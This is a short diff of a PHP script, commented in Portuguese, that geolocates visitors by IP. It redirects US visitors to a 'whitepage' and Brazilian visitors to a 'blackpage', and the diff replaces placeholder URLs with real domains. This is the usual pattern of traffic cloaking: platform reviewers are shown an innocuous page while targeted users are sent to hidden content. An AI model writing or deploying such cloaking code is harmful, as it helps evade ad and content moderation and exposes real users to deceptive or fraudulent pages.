@@ -17,12 +17,12 @@ try {
 
             if ($pais === 'US') {
                 // REDIRECIONA AMERICANOS PARA WHITEPAGE
-                header("Location: https://seusite.com/whitepage");
+                header("Location: https://blog.ventureshop.com.br/");
                 exit;
             } 
             elseif ($pais === 'BR') {
                 // REDIRECIONA BRASILEIROS PARA BLACKPAGE
-                header("Location: https://seusite.com/blackpage");
+                header("Location: https://revolver-one.vercel.app/");
                 exit;
             }
         }
@@ -33,4 +33,5 @@ try {
 
 // Destino caso o IP não seja nem BR nem US ou a API falhe
 echo "Acesso não permitido para sua região.";
+
 ?>
